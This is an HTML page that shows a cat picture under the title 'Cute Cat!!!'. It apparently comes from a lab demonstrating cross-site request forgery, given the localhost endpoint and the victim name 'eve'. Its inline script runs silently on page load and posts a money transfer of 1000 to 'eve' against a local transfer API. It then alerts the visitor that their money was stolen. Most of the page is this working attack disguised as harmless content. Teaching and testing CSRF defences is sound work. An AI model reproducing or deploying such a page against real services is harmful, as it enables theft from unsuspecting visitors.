<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Cute Cat!!!</title>

</head>

<body>
    <h2>What a Cute Cat!!!</h2>

    <img src="cat.jpg" />


    <script>
        (function(){

            var to = "eve";
            var amount = 1000;

            var xmlhttp = new XMLHttpRequest();

            xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState === XMLHttpRequest.DONE) {
                    if (xmlhttp.status === 200) {
                        alert("Thank you!!! I just stole your money...");
                    } else {
                        alert("Damn... I tried to steal your money but something when wrong");
                    }
                }
            };

            var payload = "to="+encodeURI(to)+"&amount="+encodeURI(amount);

            xmlhttp.open("POST", "http://localhost:8080/api/transfer", true);
            xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xmlhttp.send(payload);

        }());
    </script>
</body>

</html>
